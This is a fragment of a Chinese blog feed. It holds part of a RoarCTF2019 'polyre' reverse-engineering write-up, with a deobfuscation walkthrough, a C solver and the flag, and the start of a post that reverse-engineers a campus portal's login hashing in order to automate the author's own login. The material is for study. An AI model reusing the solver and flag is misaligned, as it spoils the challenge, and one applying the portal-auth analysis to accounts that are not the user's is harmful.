( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v21 = v7;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">        v22 = v21 &lt; <span class="number">64</span>;</span><br><span class="line">      <span class="keyword">while</span> ( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; ((((_BYTE)dword_603054 - <span class="number">1</span>) * (_BYTE)dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> );</span><br><span class="line">      <span class="keyword">if</span> ( !v22 )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v23 = v4;</span><br><span class="line">      v24 = v4 &lt; <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v4 &gt;= <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v27 = v4;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">          v28 = <span class="number">2</span> * v27;</span><br><span class="line">        <span class="keyword">while</span> ( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; ((((_BYTE)dword_603054 - <span class="number">1</span>) * (_BYTE)dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> );</span><br><span class="line">        v4 = v28;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v25 = <span class="number">2</span> * v4;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">          v26 = v25;</span><br><span class="line">        <span class="keyword">while</span> ( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; ((((_BYTE)dword_603054 - <span class="number">1</span>) * (_BYTE)dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> );</span><br><span class="line">        v4 = v26 ^ <span class="number">0xB0004B7679FA26B3</span>LL;</span><br><span class="line">      &#125;</span><br><span class="line">      v29 = v7;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">        v7 = v29 + <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">while</span> ( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; ((((_BYTE)dword_603054 - <span class="number">1</span>) * (_BYTE)dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    v30 = <span class="number">8</span> * i;</span><br><span class="line">    v31 = &amp;s1[<span class="number">8</span> * i];</span><br><span class="line">    <span class="keyword">if</span> ( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; ((((_BYTE)dword_603054 - <span class="number">1</span>) * (_BYTE)dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">LABEL_55:</span><br><span class="line">      *(_QWORD *)v31 = v4;</span><br><span class="line">    *(_QWORD *)v31 = v4;</span><br><span class="line">    <span class="keyword">if</span> ( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; ((((_BYTE)dword_603054 - <span class="number">1</span>) * (_BYTE)dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_55;</span><br><span class="line">    v32 = i + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">    v33 = <span class="built_in">memcmp</span>(s1, &amp;unk_402170, <span class="number">0x30</span>uLL);</span><br><span class="line">  <span class="keyword">while</span> ( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; ((((_BYTE)dword_603054 - <span class="number">1</span>) * (_BYTE)dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> );</span><br><span class="line">  v34 = v33 != <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; ((((_BYTE)dword_603054 - <span class="number">1</span>) * (_BYTE)dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( v34 )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Wrong!&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Correct!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> v10;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>自习一看其实就发现其实它还是加了一些混淆，比如里面重复的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; ((((_BYTE)dword_603054 - <span class="number">1</span>) * (_BYTE)dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br></pre></td></tr></table></figure><p>这个表达式实际上是永远为假的，它因为dword_603058这个全局变量是在bss段上的，bss段上为未初始化的全局变量，所以它就是0。而且查一下它的交叉引用表也会发现与它相关的指令都是作为源操作数而非目的操作数，而且也没有取它地址做某些操作，在此基础之上我们基本可以认为它就是不变的。</p><p><img src="/2021/12/15/[RoarCTF2019]polyre%20writeup/5.png" alt="5"></p><p>所以这去了混淆之后还有一百多行的代码其实是他自己手动疯狂加的混淆。所以这里直接把所有的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">do</span></span></span><br><span class="line"><span class="function">xxx</span></span><br><span class="line"><span class="function"><span class="title">while</span> <span class="params">( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; ((((_BYTE)dword_603054 - <span class="number">1</span>) * (_BYTE)dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span></span></span><br></pre></td></tr></table></figure><p>全部替换成xxx就好了，因为它只执行一次就退出了。</p><p>此外还有一些永为1的表达式。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( dword_603058 &lt; <span class="number">10</span> || ((((_BYTE)dword_603054 - <span class="number">1</span>) * (_BYTE)dword_603054) &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>这种情况下我我们直接把while循环去了，然后把这个语句之后在while循环语句内的所有语句都删了。</p><p>然后得到了以下的代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 v4; <span class="comment">// [rsp+1E0h] [rbp-110h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+1E8h] [rbp-108h]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [rsp+1ECh] [rbp-104h]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [rsp+1ECh] [rbp-104h]</span></span><br><span class="line">  <span class="keyword">char</span> s1[<span class="number">48</span>]; <span class="comment">// [rsp+1F0h] [rbp-100h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">60</span>]; <span class="comment">// [rsp+220h] [rbp-D0h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v10; <span class="comment">// [rsp+25Ch] [rbp-94h]</span></span><br><span class="line">  <span class="keyword">char</span> *v11; <span class="comment">// [rsp+260h] [rbp-90h]</span></span><br><span class="line">  <span class="keyword">int</span> v12; <span class="comment">// [rsp+26Ch] [rbp-84h]</span></span><br><span class="line">  <span class="keyword">bool</span> v13; <span class="comment">// [rsp+272h] [rbp-7Eh]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v14; <span class="comment">// [rsp+273h] [rbp-7Dh]</span></span><br><span class="line">  <span class="keyword">int</span> v15; <span class="comment">// [rsp+274h] [rbp-7Ch]</span></span><br><span class="line">  <span class="keyword">char</span> *v16; <span class="comment">// [rsp+278h] [rbp-78h]</span></span><br><span class="line">  <span class="keyword">int</span> v17; <span class="comment">// [rsp+284h] [rbp-6Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v18; <span class="comment">// [rsp+288h] [rbp-68h]</span></span><br><span class="line">  <span class="keyword">bool</span> v19; <span class="comment">// [rsp+28Fh] [rbp-61h]</span></span><br><span class="line">  <span class="keyword">char</span> *v20; <span class="comment">// [rsp+290h] [rbp-60h]</span></span><br><span class="line">  <span class="keyword">int</span> v21; <span class="comment">// [rsp+298h] [rbp-58h]</span></span><br><span class="line">  <span class="keyword">bool</span> v22; <span class="comment">// [rsp+29Fh] [rbp-51h]</span></span><br><span class="line">  __int64 v23; <span class="comment">// [rsp+2A0h] [rbp-50h]</span></span><br><span class="line">  <span class="keyword">bool</span> v24; <span class="comment">// [rsp+2AFh] [rbp-41h]</span></span><br><span class="line">  __int64 v25; <span class="comment">// [rsp+2B0h] [rbp-40h]</span></span><br><span class="line">  __int64 v26; <span class="comment">// [rsp+2B8h] [rbp-38h]</span></span><br><span class="line">  __int64 v27; <span class="comment">// [rsp+2C0h] [rbp-30h]</span></span><br><span class="line">  __int64 v28; <span class="comment">// [rsp+2C8h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">int</span> v29; <span class="comment">// [rsp+2D0h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">int</span> v30; <span class="comment">// [rsp+2D4h] [rbp-1Ch]</span></span><br><span class="line">  <span class="keyword">char</span> *v31; <span class="comment">// [rsp+2D8h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> v32; <span class="comment">// [rsp+2E0h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v33; <span class="comment">// [rsp+2E4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">bool</span> v34; <span class="comment">// [rsp+2EBh] [rbp-5h]</span></span><br><span class="line"></span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x30</span>uLL);</span><br><span class="line">  <span class="built_in">memset</span>(s1, <span class="number">0</span>, <span class="keyword">sizeof</span>(s1));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Input:&quot;</span>);</span><br><span class="line">  v11 = s;</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, v11);</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  <span class="comment">//输入部分，碰到\n截止</span></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v12 = v6;</span><br><span class="line">    v13 = v12 &lt; <span class="number">64</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !v13 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v14 = s[v6];</span><br><span class="line">    v15 = v14;</span><br><span class="line">    <span class="keyword">if</span> ( v15 == <span class="number">10</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v16 = &amp;s[v6];</span><br><span class="line">      *v16 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    v17 = v6 + <span class="number">1</span>;</span><br><span class="line">    v6 = v17;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v18 = i;</span><br><span class="line">    v19 = v18 &lt; <span class="number">6</span>;<span class="comment">//这里可以看出只有6组</span></span><br><span class="line">    <span class="keyword">if</span> ( !v19 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v20 = s;</span><br><span class="line">    v4 = *(_QWORD *)&amp;v20[<span class="number">8</span> * i];<span class="comment">//转为了QWORD，每组八个字节</span></span><br><span class="line">    v7 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v21 = v7;</span><br><span class="line">      v22 = v21 &lt; <span class="number">64</span>;</span><br><span class="line">      <span class="keyword">if</span> ( !v22 )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v23 = v4;</span><br><span class="line">      v24 = v4 &lt; <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v4 &gt;= <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v27 = v4;</span><br><span class="line">        v28 = <span class="number">2</span> * v27;</span><br><span class="line">        v4 = v28;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v25 = <span class="number">2</span> * v4;</span><br><span class="line">        v26 = v25;</span><br><span class="line">        v4 = v26 ^ <span class="number">0xB0004B7679FA26B3</span>LL;</span><br><span class="line">      &#125;</span><br><span class="line">      v29 = v7;</span><br><span class="line">      v7 = v29 + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    v30 = <span class="number">8</span> * i;</span><br><span class="line">    v31 = &amp;s1[<span class="number">8</span> * i];</span><br><span class="line">    *(_QWORD *)v31 = v4;</span><br><span class="line">    v32 = i + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v33 = <span class="built_in">memcmp</span>(s1, &amp;unk_402170, <span class="number">0x30</span>uLL);</span><br><span class="line">  v34 = v33 != <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v34 )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Wrong!&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Correct!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> v10;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实最后看来也就是将输入的字符串分为6组，每组八个字节。然后作为long long 类型进行64次变换。</p><p>主要变换逻辑如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v4 &gt;= <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line">    v27 = v4;</span><br><span class="line">    v28 = <span class="number">2</span> * v27;</span><br><span class="line">    v4 = v28;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    v25 = <span class="number">2</span> * v4;</span><br><span class="line">    v26 = v25;</span><br><span class="line">    v4 = v26 ^ <span class="number">0xB0004B7679FA26B3</span>LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果大于0则直接*2，否则再异或一个0xB0004B7679FA26B3LL。</p><p>然后最后跟unk_402170做一个memcmp，那么就已知结果逆向输入了。主要我们需要怎么判断它是否&gt;0呢，其实很简单，我们可以看到如果&gt;0就单纯*2了，否则还会异或一个奇数，那么就从最低位的奇偶入手，如果是偶数则/2，如果不是那么就先异或再/2就好了。但是需要注意，负数/2并不能单纯右移一位，还要再高位添1才能保证是负数/2。</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>据此写出脚本</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> s[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">0x96</span>, <span class="number">0x62</span>, <span class="number">0x53</span>, <span class="number">0x43</span>, <span class="number">0x6D</span>, <span class="number">0xF2</span>, <span class="number">0x8F</span>, <span class="number">0xBC</span>, </span><br><span class="line">  <span class="number">0x16</span>, <span class="number">0xEE</span>, <span class="number">0x30</span>, <span class="number">0x05</span>, <span class="number">0x78</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x52</span>, </span><br><span class="line">  <span class="number">0xEC</span>, <span class="number">0x08</span>, <span class="number">0x5F</span>, <span class="number">0x93</span>, <span class="number">0xEA</span>, <span class="number">0xB5</span>, <span class="number">0xC0</span>, <span class="number">0x4D</span>, </span><br><span class="line">  <span class="number">0x50</span>, <span class="number">0xF4</span>, <span class="number">0x53</span>, <span class="number">0xD8</span>, <span class="number">0xAF</span>, <span class="number">0x90</span>, <span class="number">0x2B</span>, <span class="number">0x34</span>, </span><br><span class="line">  <span class="number">0x81</span>, <span class="number">0x36</span>, <span class="number">0x2C</span>, <span class="number">0xAA</span>, <span class="number">0xBC</span>, <span class="number">0x0E</span>, <span class="number">0x25</span>, <span class="number">0x8B</span>, </span><br><span class="line">  <span class="number">0xE4</span>, <span class="number">0x8A</span>, <span class="number">0xC6</span>, <span class="number">0xA2</span>, <span class="number">0x81</span>, <span class="number">0x9F</span>, <span class="number">0x75</span>, <span class="number">0x55</span>, </span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> key=<span class="number">0xB0004B7679FA26B3</span>uLL;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *p=(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)s;</span><br><span class="line">    <span class="keyword">int</span> iter=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(iter&lt;<span class="number">6</span>)&#123;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> k=*p;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">64</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(k%<span class="number">2</span>)&#123;</span><br><span class="line">                k^=key;</span><br><span class="line">                k/=<span class="number">2</span>;</span><br><span class="line">                k |= <span class="number">0x8000000000000000</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                k/=<span class="number">2</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;<span class="number">8</span>;j++)&#123;</span><br><span class="line">            write(<span class="number">1</span>,((<span class="keyword">char</span> *)&amp; k)+j,<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        p++;</span><br><span class="line">        iter++;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="get-flag"><a href="#get-flag" class="headerlink" title="get flag"></a>get flag</h2><p><img src="/2021/12/15/[RoarCTF2019]polyre%20writeup/6.png" alt="6"></p><p>flag:<code>flag&#123;6ff29390-6c20-4c56-ba70-a95758e3d1f8&#125;</code></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;buu刷题记录-&lt;a href=&quot;https://buuoj.cn/challenges#[RoarCTF2019]polyre&quot;&gt;RoarCTF2019 polyre&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    <category term="re" scheme="http://example.com/categories/ctf/re/"/>
    
    
  </entry>
  
  <entry>
    <title>校园网模拟登录</title>
    <link href="http://example.com/2021/12/08/%E6%A0%A1%E5%9B%AD%E7%BD%91%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95/"/>
    <id>http://example.com/2021/12/08/%E6%A0%A1%E5%9B%AD%E7%BD%91%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95/</id>
    <published>2021-12-08T02:00:00.000Z</published>
    <updated>2021-12-08T14:08:41.120Z</updated>
    
    <content type="html"><![CDATA[<p>学校更新了校园网之后，用的宽带就需要每天早上进行一遍网页登录才能有网，非常的麻烦，我就萌生出了想写个模拟登录的脚本的想法。</p><span id="more"></span><h2 id="抓包获得请求方式"><a href="#抓包获得请求方式" class="headerlink" title="抓包获得请求方式"></a>抓包获得请求方式</h2><p>这里我用wireshark抓包，只抓从登录到登录成功这个时间段的包，这里主要分析我们发送的http的流量包。</p><p><img src="/2021/12/08/%E6%A0%A1%E5%9B%AD%E7%BD%91%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95/4.png" alt="1"></p><p>可以发现主要有两个流量包出现了username字段，那么主要分析这两个包内容的参数。第一个流量包内容如下</p><p><img src="/2021/12/08/%E6%A0%A1%E5%9B%AD%E7%BD%91%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95/5.png" alt="1"></p><p>请求api为<code>http://10.110.74.99/cgi-bin/get_challenge</code></p><p>主要有四个参数，<code>callback</code>，<code>username</code>，<code>ip</code>，和<code>_</code>。callback参数不太确定，但是可以确定username是自己登录校园网的账号，ip就是自己本机在这个局域网下的ip，而<code>_</code>很明显就是时间戳。而可以看到call_back后面也有一个类似时间戳的参数。这个暂且不确定，但是后面反复抓包可以发现，这个参数就是固定的。至于本次请求是返回了什么我们可以照着参数打进去看看返回了什么数据，本人很菜，不是打web的，不会用burpsuite只能用这种办法了。</p><p><img src="/2021/12/08/%E6%A0%A1%E5%9B%AD%E7%BD%91%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95/6.png" alt="1"></p><p>可以发现返回了一串json数据，里面主要有一个challenge字段，感觉是一个类似token的东西，其它的就没什么了，客户端ip，服务端ip，请求状态，产品版本和时间戳。而这里也方便了我们，可以直接从这里获取自己的ip了，但是网页端做这个估计主要还是为了这个token。但是这里并没有密码字段，还没有登录请求。</p><p>剩下的就看看另一个流量包</p><p><img src="/2021/12/08/%E6%A0%A1%E5%9B%AD%E7%BD%91%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95/7.png" alt="1"></p><p>第二个流量包请求的api为<code>http://10.110.74.99/cgi-bin/srun_portal</code></p><p>请求的参数很多，首先依旧是callback，跟之前一样，action参数估计是标识本次请求类型为登录，第四个参数开始出现了密码字段，而这个很明显进行了md5加密，os指示操作系统类型，name为大概也是操作系统名称的意思。还有一个double_stack，虽然不懂但是反复抓包发现这个参数也是恒定不变是0，所以也不用去理解它的意思了。chksum参数是一串可能经过某种hash算法得到的值。info同样如此，只是它括起来的这个加密算法着实没听过。然后剩下的参数都是固定的就没必要去纠结了。</p><p>所以想要成功模拟登录，必须得到这些参数，需要计算的就只有password，chksum，info三个参数，那么去分析一下网页源码看看这三个参数是怎么得到的。</p><h2 id="分析网页js"><a href="#分析网页js" class="headerlink" title="分析网页js"></a>分析网页js</h2><p>F12查看，主要寻找登录按钮点击之后干干了什么</p><h3 id="password加密"><a href="#password加密" class="headerlink" title="password加密"></a>password加密</h3><p><img src="/2021/12/08/%E6%A0%A1%E5%9B%AD%E7%BD%91%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95/1.png" alt="1"></p><p>可以看到只对前端进行了基本的校验之后调用了portal的login方法去登录，并且输入的用户名和密码也都传进了portal相应的变量当中，那么就去portal.js文件中分析。</p><p>发现文件很大，选择拷贝一份放ide中分析，寻找login函数，</p><p><img src="/2021/12/08/%E6%A0%A1%E5%9B%AD%E7%BD%91%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95/2.png" alt="2"></p><p>可以发现这里主要是进行登录类型判断，进行选择，那就接着追踪。</p><p><img src="/2021/12/08/%E6%A0%A1%E5%9B%AD%E7%BD%91%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95/3.png" alt="3"></p><p>可以发现是用一个_loginAccount函数去登录的，而这个函数就在下面，我们看看它的逻辑。</p><p><img src="/2021/12/08/%E6%A0%A1%E5%9B%AD%E7%BD%91%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95/8.png" alt="3"></p><p>这里主要有一个getToken函数,然后密码用password和token进行了md5加盐的hash加密，因此password字段就很容易得出来了，那么我们接着看看token怎么获取的，之前我们通过手动请求猜测challenge字段是可能是token，这次我们跟踪_getToken函数看看。</p><p><img src="/2021/12/08/%E6%A0%A1%E5%9B%AD%E7%BD%91%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95/9.png" alt="3"></p><p>发现这里返回了res.challenge，那么就可以大胆推定刚刚的challenge就是token了。那么登录的流程应该就是，先去请求一个token，然后用token进行加密登录。这里先给出md5加密的脚本，这里参考了别的师傅的博客的做法，在这里—-&gt;<a href="https://blog.csdn.net/qq_41797946/article/details/89417722">传送门</a>，我也一直没理解它盐是怎么加的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#srun_md5.py</span></span><br><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_md5</span>(<span class="params">password,token</span>):</span></span><br><span class="line"><span class="keyword">return</span> hmac.new(token.encode(), password.encode(), hashlib.md5).hexdigest()</span><br></pre></td></tr></table></figure><h3 id="chksum和info加密"><a href="#chksum和info加密" class="headerlink" title="chksum和info加密"></a>chksum和info加密</h3><p>翻到后面可以直接看到url的请求参数。</p><p><img src="/2021/12/08/%E6%A0%A1%E5%9B%AD%E7%BD%91%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95/10.png" alt="3"></p><p>url可以直接抓包获得，这个没必要去分析它的url是啥，主要看我们之前需要知道的三个字段，这里第二点不太明白了，虽然看到它的挡路方式好像是OTP，但是抓包获得的一直是{md5}，也不太懂为啥，但是我们姑且选择后者，毕竟实践才是检验真理的唯一标准嘛。</p><p>这里password的hmd5我们前面已经可以算了，接下来这个info的参数是i，chksum的参数是sha1(str)，对str进行了sha1加密。那么我们往上看看这个i和这个str是怎么获得的。</p><p><img src="/2021/12/08/%E6%A0%A1%E5%9B%AD%E7%BD%91%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95/11.png" alt="3"></p><p>这里可以看到str只是对一些参数进行了相加，最后sha1散列。</p><p>那么如此一来我们只需要得到i就可以把整个url的参数构造完成了。</p><p><img 